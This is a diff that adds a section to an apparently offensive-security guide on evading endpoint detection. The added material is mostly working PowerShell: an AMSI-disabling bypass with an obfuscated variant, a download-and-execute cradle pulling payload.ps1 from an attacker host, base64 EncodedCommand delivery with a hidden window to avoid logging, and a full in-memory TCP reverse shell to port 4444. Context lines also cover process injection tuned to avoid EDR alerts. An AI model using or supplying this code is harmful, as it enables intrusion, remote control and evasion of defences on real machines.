@@ -428,6 +428,67 @@ EDRs correlate suspicious activity via process trees. An unusual parent-child re
 # - Time delta anomalies between parent's last activity and child creation
 ```
 
+## Fileless PS Dropper with AMSI Bypass
+
+A complete fileless dropper that patches AMSI in-memory before executing the payload:
+
+```powershell
+# Step 1: AMSI bypass (patches amsiInitFailed flag in SMA assembly)
+# This causes AMSI to report initialization failure → scanning is skipped
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') |
+    ForEach-Object { $_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
+
+# Step 2: Download and execute payload in memory (no disk writes)
+$remotePayload = "http://192.168.1.100/payload.ps1"
+$code = (New-Object Net.WebClient).DownloadString($remotePayload)
+IEX $code
+```
+
+**Obfuscated variant** to evade static detection of the AMSI bypass string:
+
+```powershell
+# Split the AMSI type name to avoid string-matching
+$a = 'System.Management.Automation.A'
+$b = 'msiUtils'
+$t = [Ref].Assembly.GetType($a + $b)
+$f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
+$f.SetValue($null, $true)
+
+# Now execute payload
+IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1'))
+```
+
+**Base64 encoded delivery** to hide the full command from command-line logging:
+
+```bash
+# On attacker machine: encode the dropper
+cat dropper.ps1 | iconv -f ascii -t utf-16le | base64 -w 0
+
+# Deliver as EncodedCommand (avoids plain-text in process args)
+powershell.exe -nop -w hidden -EncodedCommand <base64string>
+```
+
+The `-EncodedCommand` flag accepts a UTF-16LE base64 string. This hides the command content from command-line telemetry, though Script Block Logging (if enabled) will still capture the decoded script.
+
+**TCP reverse shell payload** (in-memory, no binary written):
+
+```powershell
+# Reverse shell in memory — no file written
+$c = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4444)
+$s = $c.GetStream()
+[byte[]]$b = 0..65535 | % {0}
+while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
+    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i)
+    $r = (Invoke-Expression $d 2>&1 | Out-String)
+    $sb = ([Text.Encoding]::ASCII).GetBytes($r)
+    $s.Write($sb, 0, $sb.Length)
+    $s.Flush()
+}
+$c.Close()
+```
+
+---
+
 ## Portable Executable Injection — Full WinAPI Sequence
 
 PE injection copies shellcode into a target process's address space and executes it there using `CreateRemoteThread`. The payload runs under the target process identity, hiding malicious activity under a trusted process name. Using `VirtualAllocEx` + `VirtualProtectEx` to separate RW (write phase) from RX (execute phase) avoids the suspicious RWX memory pattern that EDRs flag.
@@ -485,3 +546,13 @@ IntPtr hThread = CreateRemoteThread(procInfo.hProcess, IntPtr.Zero, 0,
 # DllImport declarations for: CreateProcess, VirtualAllocEx, VirtualProtectEx,
 # WriteProcessMemory, CreateRemoteThread from kernel32.dll
 ```
+
+## Resources
+
+- MITRE ATT&CK T1059.001 — PowerShell — `attack.mitre.org/techniques/T1059/001/`
+- MITRE ATT&CK T1055 — Process Injection — `attack.mitre.org/techniques/T1055/`
+- AmsiScanBuffer patching (rastamouse) — `github.com/rasta-mouse/AmsiScanBufferBypass`
+- PSAmsi (bypass framework) — `github.com/cobbr/PSAmsi`
+- Nishang (PowerShell offense framework) — `github.com/samratashok/nishang`
+- PowerShDLL (PS without powershell.exe) — `github.com/p3nt4/PowerShdll`
+- ired.team Injection Techniques — `ired.team/offensive-security/code-injection-process-injection`
